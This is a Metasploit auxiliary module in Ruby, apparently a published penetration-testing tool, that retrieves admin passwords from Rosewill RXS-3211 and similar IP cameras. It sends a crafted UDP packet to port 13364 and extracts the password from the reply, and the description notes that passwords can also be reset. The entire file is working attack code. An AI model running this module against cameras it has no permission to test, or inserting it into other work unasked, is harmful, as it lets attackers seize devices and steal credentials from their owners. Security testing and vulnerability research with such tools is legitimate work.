##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(
        update_info(
            info,
            'Name'        => 'Rosewill RXS-3211 IP Camera Password Retriever',
            'Description' => %q{
              This module takes advantage of a protocol design issue with the Rosewill admin
              executable in order to retrieve passwords, allowing remote attackers to take
              administrative control over the device.  Other similar IP Cameras such as Edimax,
              Hawking, Zonet, etc, are also believed to have the same flaw, but not fully tested.
              The protocol deisgn issue also allows attackers to reset passwords on the device.
            },
            'Author'      => 'Ben Schmidt',
            'References'  =>
                [
                    [ 'URL', 'http://spareclockcycles.org/exploiting-an-ip-camera-control-protocol/' ],
                ],
            'License'     => MSF_LICENSE
        )
    )

    register_options(
      [
        Opt::CHOST,
        Opt::RPORT(13364),
      ], self.class)
  end

  def run_host(ip)
    #Protocol
    target_mac = "\xff\xff\xff\xff\xff\xff"
    cmd  = "\x00"          #Request
    cmd << "\x06\xff\xf9"  #Type

    password = nil

    begin
      # Create an unbound UDP socket if no CHOST is specified, otherwise
      # create a UDP socket bound to CHOST (in order to avail of pivoting)
      udp_sock = Rex::Socket::Udp.create( {
        'LocalHost' => datastore['CHOST'] || nil,
        'PeerHost'  => ip,
        'PeerPort'  => datastore['RPORT'],
        'Context'   =>
        {
          'Msf' => framework,
          'MsfExploit' => self
        }
      })

      udp_sock.put(target_mac+cmd)

      res = udp_sock.recvfrom(65535, 0.5) and res[1]

      #Parse the reply if we get a response
      if res
        password = parse_reply(res)
      end
    rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused, ::IOError
      print_error("Connection error")
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Unknown error: #{e.class} #{e}")
    ensure
      udp_sock.close if udp_sock
    end

    #Store the password if the parser returns something
    if password
      print_status("Password retrieved: #{password.to_s}")
      report_auth_info({
        :host         => rhost,
        :port         => rport,
        :sname        => 'ipcam',
        :duplicate_ok => false,
        :pass         => password,
      })
    end
  end

  def parse_reply(pkt)
    @results ||= {}

    # Ignore "empty" packets
    return nil if not pkt[1]

    if(pkt[1] =~ /^::ffff:/)
      pkt[1] = pkt[1].sub(/^::ffff:/, '')
    end

    return pkt[0][333,12] if pkt[0][6,4] == "\x01\x06\xff\xf9"
  end

end
